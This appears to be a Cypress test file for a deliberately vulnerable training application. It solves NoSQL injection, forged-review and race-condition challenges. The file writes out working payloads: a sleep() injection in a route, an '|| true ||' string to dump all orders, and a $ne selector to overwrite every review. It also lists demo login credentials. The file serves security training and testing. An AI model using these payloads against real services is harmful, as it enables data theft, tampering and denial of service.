async function editReview (reviewId: string) {
  const response = await fetch(
    `${Cypress.config('baseUrl')}/rest/products/reviews`,
    {
      method: 'PATCH',
      headers: {
        'Content-type': 'application/json',
        Authorization: `Bearer ${localStorage.getItem('token')}`
      },
      body: JSON.stringify({ id: reviewId, message: 'injected' })
    }
  )
  if (response.status === 200) {
    console.log('Success')
  }
}

async function fetchAndEditReview () {
  const response = await fetch(
    `${Cypress.config('baseUrl')}/rest/products/1/reviews`,
    {
      method: 'GET',
      headers: {
        'Content-type': 'text/plain'
      }
    }
  )
  if (response.status === 200) {
    const responseJson = await response.json()
    const reviewId = responseJson.data[0]._id
    await editReview(reviewId)
  }
}

async function sendPostRequest (reviewId: string) {
  const anotherResponse = await fetch(
    `${Cypress.config('baseUrl')}/rest/products/reviews`,
    {
      method: 'POST',
      headers: {
        'Content-type': 'application/json',
        Authorization: `Bearer ${localStorage.getItem('token')}`
      },
      body: JSON.stringify({ id: reviewId })
    }
  )
  if (anotherResponse.status === 200) {
    console.log('Success')
  }
}

async function injectSelector () {
  await fetch(`${Cypress.config('baseUrl')}/rest/products/reviews`, {
    method: 'PATCH',
    headers: {
      'Content-type': 'application/json',
      Authorization: `Bearer ${localStorage.getItem('token')}`
    },
    body: JSON.stringify({
      id: { $ne: -1 },
      message: 'NoSQL Injection!'
    })
  })
}

async function fetchAndLikeReviews () {
  const response = await fetch(
    `${Cypress.config('baseUrl')}/rest/products/1/reviews`,
    {
      method: 'GET',
      headers: {
        'Content-type': 'text/plain'
      }
    }
  )
  if (response.status === 200) {
    const responseJson = await response.json()
    const reviewId = responseJson.data[0]._id

    void sendPostRequest(reviewId)
    void sendPostRequest(reviewId)
    void sendPostRequest(reviewId)
  }
}

function handleNoSqlDosCheck (isDocker: unknown) {
  if (!isDocker) {
    void fetch(
      `${Cypress.config('baseUrl')}/rest/products/sleep(1000)/reviews`,
      {
        method: 'GET',
        headers: {
          'Content-type': 'text/plain'
        }
      }
    )
    cy.expectChallengeSolved({ challenge: 'NoSQL DoS' })
  }
}

function handleNoSqlExfiltrationCheck (isDocker: unknown) {
  if (!isDocker) {
    void fetch(
      `${Cypress.config('baseUrl')}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`,
      {
        method: 'GET',
        headers: {
          'Content-type': 'text/plain'
        }
      }
    )
    cy.expectChallengeSolved({ challenge: 'NoSQL Exfiltration' })
  }
}

describe('/rest/products/reviews', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })

  describe('challenge "NoSQL DoS"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })
    it('should be possible to inject a command into the get route', () => {
      cy.task('isDocker').then(handleNoSqlDosCheck)
    })
  })

  describe('challenge "NoSQL Exfiltration"', () => {
    it('should be possible to inject and get all the orders', () => {
      cy.task('isDocker').then(handleNoSqlExfiltrationCheck)
    })
  })

  describe('challenge "NoSQL Manipulation"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    it('should be possible to inject a selector into the update route', () => {
      cy.window().then(injectSelector)
      cy.expectChallengeSolved({ challenge: 'NoSQL Manipulation' })
    })
  })

  describe('challenge "Forged Review"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to edit any existing review', () => {
      cy.visit('/')
      cy.window().then(fetchAndEditReview)
      cy.expectChallengeSolved({ challenge: 'Forged Review' })
    })
  })

  describe('challenge "Multiple Likes"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to like reviews multiple times', () => {
      cy.visit('/')
      cy.window().then(fetchAndLikeReviews)
      cy.expectChallengeSolved({ challenge: 'Multiple Likes' })
    })
  })
})
